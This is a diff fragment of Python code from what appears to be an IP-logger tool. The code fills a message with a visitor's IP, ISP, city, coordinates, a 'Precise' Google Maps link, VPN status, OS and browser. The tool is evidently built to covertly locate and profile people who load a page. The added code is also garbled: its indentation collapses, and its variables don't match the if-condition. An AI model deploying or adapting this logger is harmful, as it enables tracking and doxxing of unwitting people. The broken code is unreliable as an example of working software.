@@ -250,31 +250,31 @@ height: 100vh;
 
                     
                  message = config["message"]["message"]
-        if config["message"]["richMessage"] and result:
-            message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-            message = message.replace("{isp}", result["isp"])
-            message = message.replace("{asn}", result["as"])
-            message = message.replace("{country}", result["country"])
-            message = message.replace("{region}", result["regionName"])
-            message = message.replace("{city}", result["city"])
-            message = message.replace("{lat}", str(result["lat"]))
-            message = message.replace("{long}", str(result["lon"]))
-            message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-            message = message.replace("{mobile}", str(result["mobile"]))
-            message = message.replace("{vpn}", str(result["proxy"]))
-            message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                 
+       if config["message"]["richMessage"] and result:
+message = message.replace("{ip}", ip if ip else 'Unknown')
+message = message.replace("{isp}", info['isp'] if info['isp'] else 'Unknown')
+message = message.replace("{asn}", info['as'] if info['as'] else 'Unknown')
+message = message.replace("{hostname}", info['hostname'] if 'hostname' in info else 'Unknown')
+message = message.replace("{connectionType}", info['connectionType'] if 'connectionType' in info else 'Unknown')
+message = message.replace("{country}", info['country'] if info['country'] else 'Unknown')
+message = message.replace("{region}", info['regionName'] if info['regionName'] else 'Unknown')
+message = message.replace("{last_seen}", info['last_seen'] if 'last_seen' in info else 'Unknown')
+message = message.replace("{org}", info['org'] if info['org'] else 'Unknown')
+message = message.replace("{city}", info['city'] if info['city'] else 'Unknown')
+message = message.replace("{coords}", str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', '))
+message = message.replace("{coords_info}", 'Approximate' if not coords else f'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{coords})')
+message = message.replace("{timezone}", info['timezone'].split('/')[1].replace('_', ' '))
+message = message.replace("{timezone_region}", info['timezone'].split('/')[0])
+message = message.replace("{mobile}", info['mobile'])
+message = message.replace("{vpn}", info['proxy'])
+message = message.replace("{bot}", info['hosting'] if info['hosting'] and not info['proxy'] else ('Possibly' if info['hosting'] else 'False'))
+message = message.replace("{os}", os)
+message = message.replace("{os_version}", info['os_version'] if 'os_version' in info else 'Unknown')
+message = message.replace("{browser}", browser)
+message = message.replace("{user_agent}", info['user_agent'] if 'user_agent' in info else 'Unknown')
 
-           
-            user_agent_info = get_user_agent_info(self.headers.get('user-agent'))
-            message = message.replace("{browser}", user_agent_info["browser"])
-            message = message.replace("{browser_version}", user_agent_info["browser_version"])
-            message = message.replace("{os}", user_agent_info["os"])
-            message = message.replace("{os_version}", user_agent_info["os_version"])
-            message = message.replace("{device}", self.get_device_type(self.headers.get('user-agent')))
-            message = message.replace("{language}", self.headers.get('Accept-Language', 'Unknown'))
-            message = message.replace("{referrer}", self.headers.get('Referer', 'Unknown'))
-            
- datatype = 'text/html'
+  datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
